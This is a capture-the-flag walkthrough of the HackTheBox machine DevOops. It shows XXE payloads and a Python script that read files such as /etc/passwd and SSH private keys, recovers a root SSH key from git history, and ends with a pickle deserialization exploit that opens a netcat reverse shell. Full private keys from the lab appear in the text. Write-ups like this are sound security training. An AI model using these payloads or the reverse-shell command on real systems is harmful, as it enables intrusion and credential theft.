---
title: HTB: DevOops
url: https://0xdf.gitlab.io/2018/10/13/htb-devoops.html
date: 2018-10-13T14:58:15+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, hackthebox, htb-devoops, xxe, ssh, git, pickle, deserialization, htb-canape, rss
---

![](https://0xdfimages.gitlab.io/img/devoops-cover.png)DevOops was a really fun box that did a great job of providing interesting challenges that weren’t too difficult to solve. I’ll show how to gain access using XXE to leak the users SSH key, and then how I get root by discovering the root SSH key in an old git commit. In Beyond Root, I’ll show an alternative path to user shell exploiting a python pickle deserialization bug.

## Box Info

| Name | [DevOops](https://hackthebox.com/machines/devoops)  [DevOops](https://hackthebox.com/machines/devoops) [Play on HackTheBox](https://hackthebox.com/machines/devoops) |
| --- | --- |
| Release Date | 02 Jun 2018 |
| Retire Date | 04 May 2024 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for DevOops |
| Radar Graph | Radar chart for DevOops |
| First Blood User | 00:17:40[l0zi0 l0zi0](https://app.hackthebox.com/users/29035) |
| First Blood Root | 00:39:09[frozenbrain frozenbrain](https://app.hackthebox.com/users/40913) |
| Creator | [lokori lokori](https://app.hackthebox.com/users/28020) |

## Recon

### nmap

`nmap` shows two ports, ssh and http on port 5000. The host OS is likely Ubuntu, and likely [16.04 Xenial](https://packages.ubuntu.com/xenial/openssh-server) based on the ssh version. Port 5000 is the default port for Flask, so this could be a gunicorn hosted Flask site.

```

root@kali# nmap -sT -p- --min-rate 5000 10.10.10.91
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-11 16:53 EDT
Nmap scan report for 10.10.10.91
Host is up (0.019s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 7.91 seconds

root@kali# nmap -sV -sC -p 22,5000 10.10.10.91
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-11 16:54 EDT
Nmap scan report for 10.10.10.91
Host is up (0.018s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
5000/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.56 seconds

```

### HTTP - Port 5000

#### Site

The main site has one big image, and some under construction text.

![1528024133069](https://0xdfimages.gitlab.io/img/1528024133069.png)

The site says it will be the “MVP for a Blogfeeder application”. MVP likely means Minimum Viable Product, which makes sense since the next line says it’ll be replaced by a “proper feed”.

#### gobuster

Start a `gobuster` for enumeration, and find two paths:

```

root@kali# gobuster -u http://10.10.10.91:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt -t 30

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.91:5000/
[+] Threads      : 30
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 301,302,307,200,204
[+] Extensions   : .txt
=====================================================
/feed (Status: 200)
/upload (Status: 200)

```

#### /feed

This is the image source for the image in the page root.

#### /upload

The upload path gives a test API interface to upload files as a development tool, and gives a hint about the file format being xml and what elements are expected.

![1528139555306](https://0xdfimages.gitlab.io/img/1528139555306.png)

## XXE File Read

### Benign Interaction with /upload

Based on the hint from the site, I’ll start by trying to upload an XML file that looks like this:

```

<Author>0xdf</Author>
<Subject>Testing</Subject>
<Content>This is a test</Content>

```

Unfortunately, submitting that responds with a 500 status:

![1528139640888](https://0xdfimages.gitlab.io/img/1528139640888.png)

Since I know this is going to be a blog feed, which are typically run on xml-based rss, I’ll look into that standard. Let’s grab the feed.xml file from this blog, which is located at `https://0xdf.gitlab.io`:

```

root@kali# curl -s https://0xdf.gitlab.io/feed.xml | xmllint --format - | head -16
<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <generator uri="https://jekyllrb.com/" version="3.8.4">Jekyll</generator>
  <link href="https://0xdf.gitlab.io/feed.xml" rel="self" type="application/atom+xml"/>
  <link href="https://0xdf.gitlab.io/" rel="alternate" type="text/html"/>
  <updated>2018-10-11T20:03:14+00:00</updated>
  <id>https://0xdf.gitlab.io/feed.xml</id>
  <title type="html">0xdf hacks stuff</title>
  <subtitle>CTF solutions, malware analysis, home lab development</subtitle>
  <entry>
    <title type="html">PWK Notes: Post-Exploitation Windows File Transfers with SMB</title>
    <link href="https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html" rel="alternate" type="text/html" title="PWK Notes: Post-Exploitation Windows File Transfers with SMB"/>
    <published>2018-10-11T13:23:26+00:00</published>
    <updated>2018-10-11T13:23:26+00:00</updated>
    <id>https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers</id>
    <content type="html" xml:base="https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html">&lt;p&gt;Moving files to and from a compromised Linux machine is, in general, pretty easy. You
’ve got nc, wget, curl, and if you get really desperate, base64 copy and paste. Windows, is another issue all together. PowerShell makes this somewhat easier, but for a lot of the PWK labs, the systems are too old to have PowerShell. The course material goes over a few ways to achieve this, but they don’t cover my favorite - SMB. This may be less realistic in an environment where you have to connect from a victim machine back to your attacker box over the public internet (where SMB could be blocked), but for environments like PWK labs and HTB where you are vpned into the same LAN as your targets, it works great.&lt;/p&gt;

```

After the information about the blog in general, there’s an `<entry>` section, and inside that is a `<content>` tag. And while there’s no `<author>` or `<subject>`, those would seem like they might fit there, so let’s give that a try.

Submit this file:

```

<entry>
<Author>0xdf</Author>
<Subject>Testing</Subject>
<Content>This is a test</Content>
</entry>

```

And get this response:

```

HTTP/1.1 200 OK
Server: gunicorn/19.7.1
Date: Mon, 04 Jun 2018 19:17:00 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 163

 PROCESSED BLOGPOST:
  Author: 0xdf
 Subject: Testing
 Content: This is a test
 URL for later reference: /uploads/0xdf.xml
 File path: /home/roosa/deploy/src

```

Further more, the file is where they say it is:

```

root@kali# curl http://10.10.10.91:5000/uploads/0xdf.xml
<item>
<Author>0xdf</Author>
<Subject>Testing</Subject>
<Content>This is a test</Content>
</item>

```

### XXE POC

With that understanding of how to interact with the site, I’ll start looking for an XXE attack. Since the xml is displayed back to me, I can use a direct method, reading a file into an entity, and then calling it:

```

POST /upload HTTP/1.1
Host: 10.10.10.91:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.91:5000/upload
Content-Type: multipart/form-data; boundary=---------------------------1864243787215350191713873567
Content-Length: 465
Connection: close
Upgrade-Insecure-Requests: 1
-----------------------------1864243787215350191713873567
Content-Disposition: form-data; name="file"; filename="0xdf.xml"
Content-Type: text/xml

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY bar SYSTEM
  "file:///etc/lsb-release">
]>

<item>
<Author>
  &bar;
</Author>
<Subject>Testing</Subject>
<Content>This is a test</Content>
</item>
-----------------------------1864243787215350191713873567--

```

```

HTTP/1.1 200 OK
Server: gunicorn/19.7.1
Date: Mon, 04 Jun 2018 19:42:16 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 268

 PROCESSED BLOGPOST:
  Author:
  DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"

 Subject: Testing
 Content: This is a test
 URL for later reference: /uploads/0xdf.xml
 File path: /home/roosa/deploy/src

```

Now we have arbitrary file read on the box, as least as far as this user can read.

### Bash OneLiner to grab files

When I originally solved this box 4 months ago, I wrote a bash one-liner to allow me to quickly grab different files.

```

root@kali# file=/etc/lsb-release
root@kali# new=/home/roosa/.ssh/id_rsa; sed -i -e "s|${file}|${new}|g" upload.xml; file=$(echo -n $new); curl -s -X POST -F "file=@upload.xml;filename=upload.xml" http://10.10.10.91:5000/upload -x 127.0.0.1:8080 | grep -zo "Author:.*Subject" | strings | grep -v -e "Author:" -e "Subject" |  tee loot/$(echo $file | rev | cut -d'/' -f1 | rev)

```

It does the following:
1. Start with `file` as existing file read in the xxe file.
2. At the start of the line, set the new file you want to get.
3. It then replaces the old file with the new file in `upload.xml`
4. post the file and grep out the file contents from the response
5. `tee` the output to the filename in the `loot/` path

### Better Automation: Python Script

In writing this post today, I decided that oneliner was too crude, and I needed a quick python script. Here’s `devoops_get.py`:

```

#!/usr/bin/python3

import re
import requests
import sys

if len(sys.argv) < 2:
    print(f"usage: {sys.argv[0]} [path to file]")
    sys.exit()

file_name = sys.argv[1]

xml = f'''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY bar SYSTEM "file://{file_name}">
]>

<item>
<Author>
&bar;
</Author>
<Subject>Testing</Subject>
<Content>This is a test</Content>
</item>'''

files = {'file': ('xxe.xml', xml, 'text/xml')}
proxies = {'http': 'http://127.0.0.1:8080'}
try:
    r = requests.post('http://10.10.10.91:5000/upload', files=files, proxies=proxies)
    if r.status_code == 200:
        pattern = re.compile(r"Author: \n(.*)\n Subject:", flags=re.DOTALL)
        print(re.search(pattern, r.text).group(1).strip())
        sys.exit()
    else:
        pass
except requests.exceptions.ConnectionError:
    pass
print("[-] Unable to connect. Either site is down or file doesn't exist or can't be read by current user.")

```

With this script, we can get whatever file we can read:

```

root@kali# ./devoops_get.py /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"

root@kali# ./devoops_get.py /etc/shadow
[-] Unable to connect. Either site is down or file doesn't exist or can't be read by current user.

```

## User Shell - SSH as roosa

### Get RSA key for roosa

With the file read capabilities, first, get a list of users from `/etc/passwd`, grepping out users who can’t login. I’ll find 3 users:

```

root@kali# ./devoops_get.py /etc/passwd | grep -v -e false -e nologin -e sync
root:x:0:0:root:/root:/bin/bash
git:x:1001:1001:git,,,:/home/git:/bin/bash
roosa:x:1002:1002:,,,:/home/roosa:/bin/bash

```

As SSH is open, check each user for an RSA key:

```

root@kali# ./devoops_get.py /root/.ssh/id_rsa
[-] Unable to connect. Either site is down or file doesn't exist or can't be read by current user.
root@kali# ./devoops_get.py /home/git/.ssh/id_rsa
[-] Unable to connect. Either site is down or file doesn't exist or can't be read by current user.
root@kali# ./devoops_get.py /home/roosa/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J
R/R+exNggHuqsp8rrcHq96lbXtORy8SOliUjfspPsWfY7JbktKyaQK0JunR25jVk
v5YhGVeyaTNmSNPTlpZCVGVAp1RotWdc/0ex7qznq45wLb2tZFGE0xmYTeXgoaX4
9QIQQnoi6DP3+7ErQSd6QGTq5mCvszpnTUsmwFj5JRdhjGszt0zBGllsVn99O90K
m3pN8SN1yWCTal6FLUiuxXg99YSV0tEl0rfSUwIDAQABAoIBAB6rj69jZyB3lQrS
JSrT80sr1At6QykR5ApewwtCcatKEgtu1iWlHIB9TTUIUYrYFEPTZYVZcY50BKbz
ACNyme3rf0Q3W+K3BmF//80kNFi3Ac1EljfSlzhZBBjv7msOTxLd8OJBw8AfAMHB
lCXKbnT6onYBlhnYBokTadu4nbfMm0ddJo5y32NaskFTAdAG882WkK5V5iszsE/3
koarlmzP1M0KPyaVrID3vgAvuJo3P6ynOoXlmn/oncZZdtwmhEjC23XALItW+lh7
e7ZKcMoH4J2W8OsbRXVF9YLSZz/AgHFI5XWp7V0Fyh2hp7UMe4dY0e1WKQn0wRKe
8oa9wQkCgYEA2tpna+vm3yIwu4ee12x2GhU7lsw58dcXXfn3pGLW7vQr5XcSVoqJ
Lk6u5T6VpcQTBCuM9+voiWDX0FUWE97obj8TYwL2vu2wk3ZJn00U83YQ4p9+tno6
NipeFs5ggIBQDU1k1nrBY10TpuyDgZL+2vxpfz1SdaHgHFgZDWjaEtUCgYEA2B93
hNNeXCaXAeS6NJHAxeTKOhapqRoJbNHjZAhsmCRENk6UhXyYCGxX40g7i7T15vt0
ESzdXu+uAG0/s3VNEdU5VggLu3RzpD1ePt03eBvimsgnciWlw6xuZlG3UEQJW8sk
A3+XsGjUpXv9TMt8XBf3muESRBmeVQUnp7RiVIcCgYBo9BZm7hGg7l+af1aQjuYw
agBSuAwNy43cNpUpU3Ep1RT8DVdRA0z4VSmQrKvNfDN2a4BGIO86eqPkt/lHfD3R
KRSeBfzY4VotzatO5wNmIjfExqJY1lL2SOkoXL5wwZgiWPxD00jM4wUapxAF4r2v
vR7Gs1zJJuE4FpOlF6SFJQKBgHbHBHa5e9iFVOSzgiq2GA4qqYG3RtMq/hcSWzh0
8MnE1MBL+5BJY3ztnnfJEQC9GZAyjh2KXLd6XlTZtfK4+vxcBUDk9x206IFRQOSn
y351RNrwOc2gJzQdJieRrX+thL8wK8DIdON9GbFBLXrxMo2ilnBGVjWbJstvI9Yl
aw0tAoGAGkndihmC5PayKdR1PYhdlVIsfEaDIgemK3/XxvnaUUcuWi2RhX3AlowG
xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq
82W3d4vCUPkKnrgG8F7s3GL6cqWcbZBd0j9u88fUWfPxfRaQU3s=
-----END RSA PRIVATE KEY-----

```

Perfect.

### SSH as roosa

I’ll get a shell on the box with roosa’s private key:

```

root@kali# ssh roosa@10.10.10.91 -i ~/id_rsa_devoops_roosa
The authenticity of host '10.10.10.91 (10.10.10.91)' can't be established.
ECDSA key fingerprint is SHA256:hbD2D4PdnIVpAFHV8sSAbtM0IlTAIpYZ/nwspIdp4Vg.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.91' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.

Last login: Mon Jun  4 17:33:47 2018 from 10.10.15.221
roosa@gitter:~$

```

In the homedir, we find user.txt:

```

roosa@gitter:~$ cat user.txt
c5808e16...

```

## Privesc: roosa –> root

### Identify git repo

In poking around roosa’s home directory, I noticed a git repo (a `.git` folder). Given that theme of the box, I decided to look for .git repositories on the host:

```

roosa@gitter:~$ find / -type d -name '.git' 2>/dev/null
/home/roosa/work/blogfeed/.git

```

### Check History

Looking more closely at the git repo, use `git` to check the current status:

```

roosa@gitter:~/work/blogfeed$ git status
On branch master
Your branch is up-to-date with 'origin/master'.
Untracked files:
  (use "git add <file>..." to include in what will be committed)

        src/.feed.py.swp
        src/access.log
        src/app.py
        src/app.py~
        src/config.py
        src/devsolita-snapshot.png
        src/feed.log
        src/feed.pyc
        src/save.p

nothing added to commit but untracked files present (use "git add" to track)

```

Also look at the `git` history. I’ll use `--name-only` to get list of the files that changed in each commit, and `--oneline` to reduce space:

```

roosa@gitter:~/work/blogfeed$ git log --name-only --oneline
7ff507d Use Base64 for pickle feed loading
src/feed.py
src/index.html
26ae6c8 Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.
run-gunicorn.sh
src/feed.py
cec54d8 Debug support added to make development more agile.
run-gunicorn.sh
src/feed.py
ca3e768 Blogfeed app, initial version.
src/feed.py
src/index.html
src/upload.html
dfebfdf Gunicorn startup script
run-gunicorn.sh
33e87c3 reverted accidental commit with proper key
resources/integration/authcredentials.key
d387abf add key for feed integration from tnerprise backend
resources/integration/authcredentials.key
1422e5a Initial commit
README.md

```

### Get SSH Key From Commit

That message is interesting: `reverted accidental commit with proper key`, just after `add key for feed integration from tnerprise backend`. There’s also only one file changed between those two commits, `resources/integration/authcredentials.key`.

It’d be possible to see the key by just running `git diff 1422e5a d387abf`, seeing the difference between the two commits.

But it’d be more interesting to show the power of git, and checkout the file from the past commit. Watch the md5 value of the key as I make changes. First, check the value before any changes:

```

roosa@gitter:~/work/blogfeed$ md5sum resources/integration/authcredentials.key
f57f7e28835e631c37ad0d090ef3b6fd  resources/integration/authcredentials.key

```

Now checkout the version from the old commit:

```

roosa@gitter:~/work/blogfeed$ git checkout d387abf -- resources/integration/authcredentials.key
roosa@gitter:~/work/blogfeed$ md5sum resources/integration/authcredentials.key
d880df0f57e4143a0fcb46fdd76e270b  resources/integration/authcredentials.key
roosa@gitter:~/work/blogfeed$ cat resources/integration/authcredentials.key
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
-----END RSA PRIVATE KEY-----

```

Once I’m done, I’ll clean up by reverting back to the last commit:

```

roosa@gitter:~/work/blogfeed$ git reset --hard 7ff507d
HEAD is now at 7ff507d Use Base64 for pickle feed loading
roosa@gitter:~/work/blogfeed$ md5sum resources/integration/authcredentials.key
f57f7e28835e631c37ad0d090ef3b6fd  resources/integration/authcredentials.key

```

### SSH as root

Now that I’ve got a RSA key that was not supposed to be published, I’ll check if it will work for root access, and it does. From there, I’ll grab the root flag.

```

root@kali# ssh -i ~/rsa_keys/id_rsa_devoops_root root@10.10.10.91
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.

Last login: Mon Mar 26 06:23:48 2018 from 192.168.57.1
root@gitter:~# wc -c root.txt
33 root.txt
root@gitter:~# cat root.txt
d4fe1e7f...

```

## Beyond Root

### Pickle Exploit for User Shell

#### Discovery

With shell access as roosa, I starting taking a look at the Flask source code, and in the imports in `~/deploy/src/feed.py`, something immediately caught my eye:

```

import cPickle as pickle

```

Looking further, in addition to the two paths I found with `gobuster`, there’s another one:

```

@app.route("/newpost", methods=["POST"])
def newpost():
  # TODO: proper save to database, this is for testing purposes right now
  picklestr = base64.urlsafe_b64decode(request.data)
#  return picklestr
  postObj = pickle.loads(picklestr)
  return "POST RECEIVED: " + postObj['Subject']

```

I noticed this with shell access, but this could have just as easily been pulled with what was known pre-shell and with XXE. The upload function announces that the file path is `/home/roosa/deploy/src`, and the main page says “This is feed.py”.

#### Benign Interaction

Before moving to exploit, the first thing I did was to try to get the site to work as expected. Just visiting the path with a browser returns a “Method Not Allowed” message, which makes sense, since the method are defined in the source as `["POST"]`.

So I’ll go into burp, find that request, send it to repeater, and change the method to POST. Sending it with no data returns a 500. Makes sense, since it will try to base64 decode nothing, and throw an exception.

The code is going to base64 decode the data, and then use pickle to load it. The resulting object will be a dictionary with a ‘Subject’ key. So to build data this will handle correctly, I’ll do the opposite, start with a dictionary with a Subject key, pickle it, and then base64 encode it.

```

root@kali# python
Python 2.7.15+ (default, Aug 31 2018, 11:56:52)
[GCC 8.2.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import cPickle as pickle
>>> import base64
>>> a = {'Subject': 'test'}                                                                               >>> a
{'Subject': 'test'}
>>> pickle.dumps(a)
"(dp1\nS'Subject'\np2\nS'test'\np3\ns."
>>> pickle.loads("(dp1\nS'Subject'\np2\nS'test'\np3\ns.")
{'Subject': 'test'}
>>> base64.urlsafe_b64encode(pickle.dumps(a))
'KGRwMQpTJ1N1YmplY3QnCnAyClMndGVzdCcKcDMKcy4='

```

Back to repeater, and add that string to the data in the post:

```

POST /newpost HTTP/1.1
Host: 10.10.10.91:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 46

KGRwMQpTJ1N1YmplY3QnCnAyClMndGVzdCcKcDMKcy4=

```

And it works:

```

HTTP/1.1 200 OK
Server: gunicorn/19.7.1
Date: Fri, 12 Oct 2018 09:46:36 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 19

POST RECEIVED: test

```

#### Exploitation

Pickle is python’s serialization library, and as is true with most serialization / deserialization methods, it’s extremely risky to use with user controlled input. There’s another example of pickle exploitation in [my Canape writeup](/2018/09/15/htb-canape.html).

Serialization allows a programmer to take an object within a program and save it as a text string, so that that string can be loaded later and/or on a different host and the full object will be available. When python runs the deserialization functions (`load` or `loads`) and gets an object, it will always attempt to run that object’s `__reduce__` method, which is used to clean up things that don’t serialize well, such as a file handle.

We can take advantage of that to get RCE. First, build the malicious string to submit:

```

>>> import os
>>> class Exploit(object):
...     def __init__(self, cmd):
...         self.cmd = cmd
...     def __reduce__(self):
...         return (os.system, (self.cmd,))

>>> pickle.dumps(Exploit('ping -c 1 10.10.14.3'))
"cposix\nsystem\np1\n(S'ping -c 1 10.10.14.3'\np2\ntRp3\n."
>>> base64.urlsafe_b64encode(pickle.dumps(Exploit('ping -c 1 10.10.14.3')))
'Y3Bvc2l4CnN5c3RlbQpwMQooUydwaW5nIC1jIDEgMTAuMTAuMTQuMycKcDIKdFJwMwou'

```

Now, post that string and see what happens:

![](https://0xdfimages.gitlab.io/img/devoops-pickle-ping.gif)

There’s a 500 error from the server, but also pings at `tcpdump`. So that’s RCE.

Now get a shell. Just re-run the python code with a new command:

```

>>> base64.urlsafe_b64encode(pickle.dumps(Exploit('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f')))
'Y3Bvc2l4CnN5c3RlbQpwMQooUydybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMC4xNC4zIDQ0MyA-L3RtcC9mJwpwMgp0UnAzCi4='

```

Post that string, and:

```

root@kali# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.91] 43402
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1002(roosa) gid=1002(roosa) groups=1002(roosa),4(adm),27(sudo)

```

### RSS Spec

I used the RSS feed from this blog to build an XML payload that would validate when submitted to the server. An alternative path would be to look at the [w3 specification for RSS](https://validator.w3.org/feed/docs/rss2.html#hrelementsOfLtitemgt), where it defines items:

> Elements of <item>
>
> A channel may contain any number of <item>s. An item may represent a “story” – much like a story in a newspaper or magazine; if so its description is a synopsis of the story, and the link points to the full story. An item may also be complete in itself, if so, the description contains the text (entity-encoded HTML is allowed), and the link and title may be omitted. All elements of an item are optional, however at least one of title or description must be present.

It lists valid elements, including author.

So if I try building an xml payload to match this spec, but also taking into account the elements the site says should be there, I’ll end up with something like this:

```

<item>
<Author>0xdf</Author>
<Subject>Testing</Subject>
<Content>This is a test</Content>
</item>

```

It turns out that this will also submit just fine to feed.py. In fact, if I change `<item>` to `<df>`, it works as well.

The source for the site shows that it takes the top element as `object` no matter what it’s name is, and then references child objects for ‘Author’, ‘Subject’, and ‘Content’.